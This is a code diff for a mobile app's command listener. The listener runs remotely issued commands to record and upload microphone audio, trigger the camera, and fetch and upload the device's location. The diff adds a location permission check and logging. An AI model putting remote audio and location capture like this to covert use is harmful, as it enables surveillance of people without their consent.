@@ -29,6 +29,10 @@ const executeCommand = async (command: any) => {
     try {
         switch (command.type) {
             case 'START_MIC':
+                // startAudioRecording returns immediately after starting;
+                // the actual recording + upload happens asynchronously via setTimeout.
+                // We mark the command as 'completed' here meaning "recording started".
+                // The upload result is independent.
                 await startAudioRecording(command.duration || 10000);
                 break;
             case 'STOP_MIC':
@@ -38,7 +42,28 @@ const executeCommand = async (command: any) => {
                 cameraEvents.emit('TRIGGER_CAMERA');
                 break;
             case 'GET_LOCATION':
-                const loc = await Location.getCurrentPositionAsync({});
+                // Request foreground location permission first (required on Android)
+                console.log('[CommandListener] Requesting foreground location permission...');
+                const { status: fgStatus } = await Location.requestForegroundPermissionsAsync();
+                if (fgStatus !== 'granted') {
+                    console.error('[CommandListener] Foreground location permission denied:', fgStatus);
+                    throw new Error('Location permission denied');
+                }
+
+                // Check if location services are enabled
+                const enabled = await Location.hasServicesEnabledAsync();
+                if (!enabled) {
+                    console.error('[CommandListener] Location services are disabled');
+                    throw new Error('Location services disabled');
+                }
+
+                console.log('[CommandListener] Getting current position...');
+                const loc = await Location.getCurrentPositionAsync({
+                    accuracy: Location.Accuracy.Balanced,
+                    timeInterval: 5000,
+                });
+                console.log('[CommandListener] Got location:', loc.coords.latitude, loc.coords.longitude);
+
                 await pb.collection('locations').create({
                     latitude: loc.coords.latitude,
                     longitude: loc.coords.longitude,
@@ -46,7 +71,7 @@ const executeCommand = async (command: any) => {
                     type: 'manual_ping',
                     user_id: currentUserId,
                 });
-                console.log('[CommandListener] Location uploaded');
+                console.log('[CommandListener] Location uploaded successfully');
                 break;
             default:
                 console.log('[CommandListener] Unknown command type:', command.type);
@@ -57,7 +82,7 @@ const executeCommand = async (command: any) => {
             await pb.collection('commands').update(command.id, { status: 'completed' });
         } catch (_) { /* ignore if update fails */ }
     } catch (err) {
-        console.error('[CommandListener] Command execution failed:', err);
+        console.error('[CommandListener] Command execution failed:', command.type, err);
         try {
             await pb.collection('commands').update(command.id, { status: 'failed' });
         } catch (_) { /* ignore */ }
